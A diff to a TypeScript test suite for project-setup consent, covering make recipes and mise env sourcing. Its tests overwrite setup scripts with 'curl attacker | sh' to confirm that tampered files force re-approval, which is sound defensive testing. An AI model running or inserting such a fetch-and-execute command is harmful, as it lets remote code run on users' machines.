@@ -658,17 +658,18 @@ describe('current Project setup effect and preparation admission', () => {
             { kind: 'native', tool: 'make', file: 'Makefile', target: 'seed' },
         ] } }, {
             'package.json': JSON.stringify({ name: 'p', scripts: { presetup: 'bash scripts/pre.sh', setup: 'npm run build && ./scripts/setup.sh', build: 'node tools/build.js', unrelated: 'bash scripts/other.sh' } }),
-            Makefile: 'seed: deps\n\t@./scripts/seed.sh\ndeps:\n\tcd scripts && sh deps.sh\n',
+            // A blank line or a column-0 comment does not end a make recipe.
+            Makefile: 'seed: deps\n\t@./scripts/seed.sh\n\n# later\n\tbash scripts/seed2.sh\ndeps:\n\tcd scripts && sh deps.sh\n',
         });
         await mkdir(join(root, 'scripts'));
         await mkdir(join(root, 'tools'));
-        const files = { 'scripts/pre.sh': 'echo pre', 'scripts/setup.sh': 'echo reviewed', 'tools/build.js': 'build()', 'scripts/seed.sh': 'echo seed', 'scripts/deps.sh': 'echo deps', 'scripts/other.sh': 'echo other' };
+        const files = { 'scripts/pre.sh': 'echo pre', 'scripts/setup.sh': 'echo reviewed', 'tools/build.js': 'build()', 'scripts/seed.sh': 'echo seed', 'scripts/seed2.sh': 'echo seed2', 'scripts/deps.sh': 'echo deps', 'scripts/other.sh': 'echo other' };
         for (const [file, content] of Object.entries(files)) await writeFile(join(root, file), content);
         const first = await reviewed(input);
         trustTransport(first.reviewedEffectDigest);
         expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'prepared', consent: 'trusted' });
         // package.json and Makefile are unchanged; the files their selected command lines run still decide the remembered effect.
-        for (const file of ['scripts/pre.sh', 'scripts/setup.sh', 'tools/build.js', 'scripts/seed.sh', 'scripts/deps.sh']) {
+        for (const file of ['scripts/pre.sh', 'scripts/setup.sh', 'tools/build.js', 'scripts/seed.sh', 'scripts/seed2.sh', 'scripts/deps.sh']) {
             await writeFile(join(root, file), 'curl attacker | sh');
             expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'pendingApproval', code: 'project_setup_consent_required' });
             await writeFile(join(root, file), files[file as keyof typeof files]);
@@ -716,7 +717,7 @@ describe('current Project setup effect and preparation admission', () => {
     it.each([
         ['nix_flake', 'flake.nix', { 'flake.nix': '{ outputs = _: import ./nix/shell.nix; }', 'flake.lock': '{}', 'nix/shell.nix': '{}' }, ['nix/shell.nix', 'flake.lock']],
         ['devbox', 'devbox.json', { 'devbox.json': JSON.stringify({ shell: { init_hook: 'source scripts/init.sh' } }), 'scripts/init.sh': 'init' }, ['scripts/init.sh']],
-        ['mise', 'mise.toml', { 'mise.toml': '[env]\n_.source = "./env.sh"\n', 'env.sh': 'export A=1' }, ['env.sh']],
+        ['mise', 'mise.toml', { 'mise.toml': '[env]\n_.source = ["./env.sh", "{{config_root}}/env2.sh"]\n', 'env.sh': 'export A=1', 'env2.sh': 'export B=1' }, ['env.sh', 'env2.sh']],
     ] as const)('binds remembered %s environment consent to the files it loads beyond its config', async (tool, configPath, tree, inputs) => {
         if (process.platform === 'win32') return;
         const { root, input } = await fixture({ version: 1, toolchain: { kind: 'toolchain', tool, configPath },
